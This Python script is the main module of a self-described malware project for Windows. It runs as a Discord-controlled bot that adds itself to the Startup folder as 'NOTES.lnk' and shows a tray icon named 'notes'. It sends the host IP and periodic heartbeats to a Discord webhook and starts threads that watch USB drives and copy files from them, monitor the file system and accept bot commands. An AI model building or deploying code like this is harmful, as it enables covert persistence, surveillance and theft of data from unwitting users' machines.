import os
import subprocess
import socket
import time
import pystray
import threading
from PIL import Image
import socket
import keyboard
import tkinter as tk
import pystray
import psutil
import requests
import shutil
import sys
from tkinter import messagebox
from win32com.client import Dispatch
# Import my modules 
from FLAG import BotEnvironmentVariable
from custom_logger import CustomLogger
from json_read_module import JSONReader,JSONParser
from discord_module import DiscordHandler
from file_monitor import start_file_monitoring,FileMonitor
from DiscordBOT import DiscordBotModule
from USB_module import USBDriveMonitor,Usb_DiscordHandler,FileCopier
import json


file_name = "Malware_config"  # Replace with the actual JSON settings file 
bot_env_var = BotEnvironmentVariable("NOTES_BOT_RUN")
logger = CustomLogger()
# Get the path to the current directory where the script is located
current_dir = os.path.dirname(__file__)

# Set the path for the flag file within the current directory
FLAG_FILE_PATH = os.path.join(current_dir, 'run_forever_flag.txt')



def pre_initialize():
    global DISCORD_WEBHOOK_URL,discord_handler
    json_reader = JSONReader(file_name)
    settings = load_settings(json_reader, "Intilize")
    bot_env_var.set_bot_run_status(True)
    DISCORD_WEBHOOK_URL = settings.get_value("discord_webhook_url")
    discord_handler = DiscordHandler(DISCORD_WEBHOOK_URL,logger)
    flag_directory = os.path.dirname(FLAG_FILE_PATH)
    if not os.path.exists(flag_directory):
        os.makedirs(flag_directory)


def initialize():
    global  DISCORD_BOT_TOKEN, FLAG_FILE_PATH
    global host_ip,ICON_FILE_NAME,task_bar_icon_url
    json_reader = JSONReader(file_name)
    settings = load_settings(json_reader, "Intilize")
    
    DISCORD_BOT_TOKEN = settings.get_value("DISCORD_BOT_TOKEN")
    ICON_FILE_NAME =settings.get_value("icon_name")
    task_bar_icon_url = settings.get_value("task_bar_icon_url")

    host_ip = socket.gethostbyname(socket.gethostname())
    discord_handler.send_embed({
        "title": "BOT started",
        "description": f"Time: {get_current_time()}, was_first_time? :{CFTA()}, Host_ip: {host_ip}",
        "color": 0x00ff00
    })
    
    
def CFTA():
    return not os.path.exists(FLAG_FILE_PATH)

def check_first_time_activation():
    if not os.path.exists(FLAG_FILE_PATH):
        # If the flag file doesn't exist, create it
        with open(FLAG_FILE_PATH, "w") as flag_file:
            flag_file.write("This flag file indicates that the script should run forever.")

        # After creating the flag file, call create_admin_shortcut function
        create_admin_shortcut()


def remove_from_startup():
    try:
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shortcut_path = os.path.join(startup_folder, "NOTES.lnk")

        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
            logger.log("Shortcut removed successfully from the startup folder.")
        else:
            logger.log("Shortcut does not exist in the startup folder.")

    except Exception as e:
        logger.log_error(f"An error occurred while remove_from_startup : {e}")

def create_admin_shortcut():
    try:
        # Get the path of the script
        script_path = os.path.abspath(sys.argv[0])

        # Check if the shortcut already exists
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_folder, "NOTES.lnk")

        if not os.path.exists(shortcut_path):
            # Create a shortcut
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.TargetPath = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.Save()

            # Move the shortcut to the startup folder
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)

            shutil.move(shortcut_path, os.path.join(startup_folder, "NOTES.lnk"))
            logger.log("Shortcut created successfully in the startup folder.")
        else:
            logger.log("Shortcut already exists in the startup folder.")
    except Exception as e:
        logger.log_error(f"Error creating shortcut: {e}")

def get_current_time():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def send_periodic_info_to_discord():
        try:
            current_time = time.strftime('%Y-%m-%d %H:%M:%S')
            message = f"Script activated at: {current_time}"
            discord_handler.send_text_message(message)
            logger.log(f"send perodic info to discord Message:'{message}'")
            time.sleep(60*5)  # Wait for 5 Min before sending the next message
        except Exception as e:
            logger.log_error(f"Error: {e}")
            time.sleep(60)  # Wait for 60 seconds before retrying in case of an error


def on_quit_callback(icon, item):
    icon.stop()
    stop_program()


def download_image(url, save_path):
    try:
        # Download the image with a timeout of 10 seconds
        response = requests.get(url, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        with open(save_path, 'wb') as f:
            f.write(response.content)
        return True
    except requests.exceptions.RequestException as e:
        logger.log_error(f"Error downloading image: {e}")
        return False

def load_icon_image(image_path):
    try:
        # Load the icon image with PIL
        icon_image = Image.open(image_path)
        return icon_image
    except Exception as e:
        logger.log_error(f"Error loading icon image: {e}")
        return None
def get_local_icon_path():
    # Get the path where the icon image should be saved or is already saved

    script_directory = os.path.dirname(os.path.abspath(__file__))
    local_icon_path = os.path.join(script_directory, ICON_FILE_NAME)
    return local_icon_path

def run_as_hidden_icon():
    # URL of the image you want to use as the system tray icon
    image_url = task_bar_icon_url  

    # Get the local path for the icon image
    local_icon_path = get_local_icon_path()

    # Download the image or use the pre-downloaded one
    if download_image(image_url, local_icon_path):
        logger.log("Icon image downloaded successfully.")
    else:
        logger.log("Using pre-downloaded icon image.")

    # Load the icon image
    icon_image = load_icon_image(local_icon_path)

    if icon_image:
        # Define menu items
        menu_items = [
            pystray.MenuItem("Quit", on_quit_callback),
            pystray.MenuItem("View Log", view_log)
        ]

        # Create the menu
        tray_menu = pystray.Menu(*menu_items)

        # Create the icon
        system_tray_icon = pystray.Icon("NOTES", icon_image, "notes", menu=tray_menu)

        # Run the icon in a separate thread
        icon_thread = threading.Thread(target=system_tray_icon.run)
        icon_thread.daemon = True  # The thread will exit when the main program exits
        icon_thread.start()
    else:
        logger.log("Failed to load the icon image.")

def view_log():
    try:
        subprocess.Popen(['notepad.exe', r"C:\Users\vinay\Desktop\WIN config.log"])
        return True
    except Exception as e:
        logger.log_error(f"Error during opening notepad: {str(e)}")
        return False
    

def stop_program():
    try:
        logger.log("Stopping the program...")
        remove_from_startup()
        discord_handler.send_embed({
            "title": "BOT is terminating itself",
            "description": f"Time: {get_current_time()}, Host_ip: {host_ip}",
            "color": 0xFF0000
        })

        # Terminate all child processes
        current_process = psutil.Process(os.getpid())
        for child_process in current_process.children(recursive=True):
            child_process.terminate()

        # Check if the flag file exists before attempting to remove it
        if os.path.exists(FLAG_FILE_PATH):
            os.remove(FLAG_FILE_PATH)
            logger.log("FLAG FILE REMOVED")
        else:
            logger.log("FLAG FILE does not exist")
        
        
        bot_env_var.set_bot_run_status(False)  
        
        sys.exit(0)  # Terminate the script

    except Exception as e:
        logger.log_error(f"Error during program termination: {str(e)}")
        try:
            # Get the process name of the current Python script
            process_name = os.path.basename(__file__)

            # Use PowerShell to find and close the program by its name
            powershell_command = f"Get-Process -name '{process_name}' | Stop-Process -Force"
            subprocess.run(["powershell", "-Command", powershell_command])
            logger.log(f"Closed {process_name} successfully.")
        except Exception as e:
            logger.log_error(f"An error occurred while closing the program: {e}")
            discord_handler.send_error_report()



def handle_exceptions(type, value, traceback):
    try:
        logger.log(f"An unhandled exception occurred: {value}")
        discord_handler.send_text_message(f"Unhandled exception occurred: {value}")
        stop_program()
    except Exception as e:
        logger.log_error(f"Error during exception handling: {str(e)}")
    finally:
        sys.__excepthook__(type, value, traceback)  # Call the default exception handler



def setup_exception_handler():
    sys.excepthook = handle_exceptions

def Monitor_file():
    json_reader = JSONReader(file_name)
    settings = load_settings(json_reader, "FileMonitor")    
    try:
        file_monitor_thread = threading.Thread(target=start_file_monitoring, args=(settings,logger,bot_env_var))
        file_monitor_thread.daemon = True  # The thread will exit when the main program exits
        file_monitor_thread.start()
    except Exception as e:
        logger.log_error(f"Error in Monitor_file thread: {e}")

def discord_bot():
    try:
        # Start the bot in a separate thread
        json_reader = JSONReader(file_name)
        settings = load_settings(json_reader, "DiscordBotModule") 
        bot_module = DiscordBotModule(logger,settings)
        bot_thread = threading.Thread(target=bot_module.start, daemon=True)
        bot_thread.start()
    except Exception as e:
        logger.log_error(f"Error in discord_bot thread: {e}")

def load_settings(json_reader, file_name):
    settings_json_string = json_reader.get_json_string(file_name)
    setting = JSONParser(settings_json_string)
    return setting
        
def usb_monitor():
    try:
        json_reader = JSONReader(file_name)
        settings = load_settings(json_reader, "USBDriveMonitor")
        discord_webhook_url = settings.get_value("discord_webhook_url")
        discord_handler = Usb_DiscordHandler(discord_webhook_url, logger)
        file_copier = FileCopier(logger)
        usb_monitor = USBDriveMonitor(discord_handler, logger, file_copier, bot_env_var, settings)
        usb_thread = threading.Thread(target=usb_monitor.main_monitoring_loop)
        usb_thread.daemon = True 
        usb_thread.start() 

    except Exception as e:
        logger.log_error(f"Error in usb_monitor thread: {e}")


def ask_confirmation():
    """Ask user for confirmation using a GUI."""
    if CFTA():   
        root = tk.Tk()
        root.withdraw()  # Hide the root window

        answer = messagebox.askyesno("Confirmation", "Do you want to start it?")                                                                                                                                
        root.destroy()  # Close the hidden root window

        return answer
    else:
        return True


def main_loop():
    
    logger.log_debug("adding key board close key")
    keyboard.add_hotkey('ctrl+shift+alt+f4', stop_program)
    logger.log_debug("setup_exception_handler ")
    setup_exception_handler()  
    logger.log_debug("check_first_time_activation ")
    check_first_time_activation()
    logger.log_debug("initialize")
    initialize()
    logger.log_debug("run_as_hidden_icon")
    run_as_hidden_icon()
    logger.log_debug("starting Monitor_file ,discord_bot,usb_monitor")
    usb_monitor()
    Monitor_file()
    discord_bot()
    
    while bot_env_var.check_bot_run_status() == True:
        send_periodic_info_to_discord()
    sys.exit(0)





def Main():
    if ask_confirmation():    
        try:
            logger.log(f"program started {get_current_time()}")
            pre_initialize()
            logger.log(f"pre_initialize")
            main_loop()
        except Exception as e:
            logger.log_error(f"fatal error occurred: {str(e)}")
            try:
                pre_initialize()
                discord_handler.send_text_message(f"fatal error occurred: {str(e)}")
                logger.log_error(f"fatal error occurred: {str(e)} So starting again ")

                main_loop()
            except Exception as e:
                logger.log_error(f"during handling error before fatal error occurred again : {str(e)}")
                stop_program()
    else:
        logger.log("user selelected not to conform!")
        stop_program()

        
    
def setting():

    pass



if __name__ == "__main__":
    setting()
    Main()
    

            




